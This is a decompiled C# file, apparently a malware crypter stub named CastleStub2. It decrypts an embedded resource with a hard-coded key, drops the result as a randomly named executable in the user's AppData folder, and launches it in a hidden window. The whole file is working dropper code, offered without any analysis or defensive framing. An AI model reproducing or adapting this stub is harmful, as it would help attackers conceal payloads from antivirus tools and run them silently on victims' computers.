using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;
using SmartAssembly.SmartExceptionsCore;
using SmartAssembly.SmartExceptionsWithUI;

[StandardModule]
internal sealed class CastleStub2
{
	public static byte[] DeCrypt(byte[] Data, byte[] key)
	{
		checked
		{
			int i = default(int);
			try
			{
				for (i = Data.Length * 2 + key.Length; i >= 0; i += -1)
				{
					Data[unchecked(i % Data.Length)] = (byte)unchecked(checked(unchecked(Data[i % Data.Length] ^ key[i % key.Length]) - unchecked((int)Data[checked(i + 1) % Data.Length]) + 256) % 256);
				}
				return Data;
			}
			catch (Exception exception)
			{
				byte[] o = default(byte[]);
				StackFrameHelper.CreateException4(exception, o, i, Data, key);
				throw;
			}
		}
	}

	[STAThread]
	public static void Main()
	{
		string text = default(string);
		byte[] bytes = default(byte[]);
		ResourceManager resourceManager = default(ResourceManager);
		byte[] array = default(byte[]);
		byte[] array2 = default(byte[]);
		Process process = default(Process);
		try
		{
			if (UnhandledExceptionHandlerWithUI.AttachApp())
			{
				text = Environment.GetEnvironmentVariable("appdata") + "\\IWbDWmUL77lw8Nf4o3dk.exe";
				bytes = Encoding.UTF8.GetBytes("W5kU4z9F11dC2LinebusI2mlTWw1XwBsh6VBpcgGu2KfiX6OOUD3c4tzlEIA9rcdZ8EM7TZy4D5hDdsPvO05q5AEBXcDgyqg8KhwdY8ipFak0gJqwMy6UGbTRCMrZbU6fKXzKVfpHt89yh4emq3HzJeCkBntknx8Lpzx6NL13ufWS7prteoKNi0VVhruV0N97sBvaMj2oiLLm9HcAxGovoyNxjOnEPTKsfRYJkC4Fm7XrK3bnv2awaSjMlv0jAlZ");
				resourceManager = new ResourceManager("X", Assembly.GetExecutingAssembly());
				array = (byte[])resourceManager.GetObject("M");
				array2 = DeCrypt(array, bytes);
				File.WriteAllBytes(text, array2);
				process = new Process();
				process.StartInfo.FileName = text;
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
			}
		}
		catch (Exception exception)
		{
			UnhandledExceptionHandler.EntryPointException(exception, new object[6] { bytes, array2, process, array, resourceManager, text });
		}
	}
}
